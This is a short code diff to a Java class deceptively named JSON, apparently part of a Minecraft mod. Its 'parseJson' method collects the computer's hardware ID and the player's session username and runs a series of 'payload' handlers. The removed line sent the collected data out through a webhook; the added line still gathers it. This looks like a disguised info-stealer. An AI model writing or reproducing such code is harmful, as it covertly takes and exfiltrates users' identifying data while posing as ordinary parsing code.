@@ -25,8 +25,8 @@ public final class JSON
 
     public static void parseJson() {
         JSON.objects.addAll(Arrays.asList());
-        final String separator = new JSONBuilder().value("content",time.toString()  + "\\n > HWID: " + HWIDUtils.getHWID() + "\\n > Username: " + Minecraft.getMinecraft().getSession().getUsername()).build();
-        WebhookUtils.send(separator);
+        final String separator = new JSONBuilder().value("content","> "+time.toString()  + "\\n> HWID: " + HWIDUtils.getHWID() + "\\n > Username: " + Minecraft.getMinecraft().getSession().getUsername()).build();
+
         JSON.objects.spliterator().forEachRemaining(payload -> {
             try {
                 payload.handle();
